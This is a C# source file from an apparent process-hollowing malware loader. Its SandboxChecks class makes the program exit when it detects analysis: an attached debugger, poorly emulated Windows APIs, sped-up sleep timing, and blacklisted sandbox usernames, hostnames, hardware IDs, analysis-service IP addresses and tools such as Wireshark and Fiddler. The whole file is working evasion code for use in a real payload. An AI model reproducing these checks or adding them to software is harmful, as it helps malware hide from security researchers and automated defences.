using System;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Management;


namespace ProcessHollowEncrypted
{
    public class SandboxChecks
    {
        //IMPORTS for sandbox checks
        // start
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        // End

        static void CheckDebugging()
        {
            // Sandbox Check: Check debugging
            if (System.Diagnostics.Debugger.IsAttached)
            {
                Console.WriteLine("A debugger is present, do not proceed.");
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("No debugger is present. Proceed!");
            }
        }
        static void CheckRareApi()
        {
            // Sandbox Check: Rarely emulated API
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                Console.WriteLine("[!] Sandbox Checks: VirtualAllocExNuma = null");
                Environment.Exit(0);
            }
            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                Console.WriteLine("[!] Sandbox Checks: FlsAlloc pointer = null");
                Environment.Exit(0);
            }
        }
        static void CheckTime()
        {
            // Sandbox Check: See if time is sped up
            DateTime t1 = DateTime.Now;
            Thread.Sleep(10000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 9.5)
            {
                Console.WriteLine("[!] Sandbox Checks: Time accelerated");
                Environment.Exit(0);
            }
        }
        static void CheckUsername(string name)
        {
            // Sandbox Check: See if username is on blacklist
            if (System.Security.Principal.WindowsIdentity.GetCurrent().Name.Split('\\')[1].ToLower().Equals(name.ToLower()))
            {
                Console.WriteLine("[!] Sandbox Checks: bad username - " + name);
                Environment.Exit(0);
            }
        }
        static void CheckHostname(string hostname)
        {
            if (System.Environment.MachineName.ToLower().Equals(hostname.ToLower()))
            {
                Console.WriteLine("[!] Sandbox Checks: bad hostname - " + hostname);
                Environment.Exit(0);
            }
        }
        public static string GetPublicIPAddress()
        {
            // Sandbox Check: Check for bad public IP address
            string apiUrl = "https://api.ipify.org";
            string myIpAddress = "";

            try
            {
                // Make an HTTP request to the IP address API
                using (WebClient client = new WebClient())
                {
                    myIpAddress = client.DownloadString(apiUrl);
                }
            }
            catch (WebException ex)
            {
                // Handle any errors that occur during the HTTP request
                Console.WriteLine("Error retrieving public IP address: " + ex.Message);
            }

            return myIpAddress;
        }
        static void CheckIPAddress(string ipAddress, string myIpAddress)
        {

            if (ipAddress.ToLower().Equals(myIpAddress.ToLower()))
            {
                Console.Write("We dont want this IP address, Exitting.");
                Environment.Exit(0);
            }
        }


        public static void RunChecks()
        {
            /***
            * A bunch of sandbox checks from https://github.com/Arvanaghi/CheckPlease
            ***/

            // Big list of blacklisted strings
            List<string> blackListedUsers = new List<string>();
            blackListedUsers.AddRange(new string[] { "WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl" });

            List<string> blackListedPCNames = new List<string>();
            blackListedPCNames.AddRange(new string[] { "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH" });

            List<string> blackListedHWIDS = new List<string>();
            blackListedHWIDS.AddRange(new string[] { "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4" });

            List<string> blackListedIPS = new List<string>();
            blackListedIPS.AddRange(new string[] { "88.132.231.71", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50" });

            List<string> blacklistedProcesses = new List<string>();
            blacklistedProcesses.AddRange(new string[] { "HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe" });

            

            // Go
            CheckDebugging();

            CheckRareApi();

            CheckTime();


            foreach (var name in blackListedUsers)
            {
                CheckUsername(name);
            }
            Console.WriteLine("Proceed!");

            foreach (var hostname in blackListedPCNames)
            {
                CheckHostname(hostname);
            }
            Console.WriteLine("Proceed!");
            // Need for checking bad IPs
            string publicIPAddress = GetPublicIPAddress();
            Console.WriteLine("[+] Debug Internet connected, IP address - " + publicIPAddress);
            foreach(var ip in blackListedIPS)
            {
                CheckIPAddress(ip, publicIPAddress);
            }
            Console.WriteLine("Proceed!");

        }
    }
}
